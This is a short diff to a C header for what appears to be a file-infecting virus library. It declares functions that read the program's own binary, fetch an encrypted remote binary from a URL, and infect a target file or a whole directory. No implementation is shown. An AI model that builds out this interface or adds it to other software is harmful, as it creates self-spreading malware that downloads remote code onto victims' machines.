@@ -2,16 +2,13 @@
 	#define HEADER_CLONELIB
 	#include <stdbool.h>
 	
-	//Structure contains string and string length
-	typedef struct Bytes{
-		char* value;
-		unsigned int length;
-	} Bytes;
-
 	//Gets own binary
-	Bytes* getOwnBytes(const char*);
+	unsigned int getOwnBytes(char**,const char*);
+	
+	//Get remote binary, in encrypted form
+	unsigned int getRemoteBytes(char** decrypted_msg, const char* url);
 
 	//Infects a target file
-	bool infectTarget(const char*, Bytes*);
+	bool infectTarget(const char*, char*, unsigned int);
 	bool infectDirectory(const char*, const char*);
 #endif
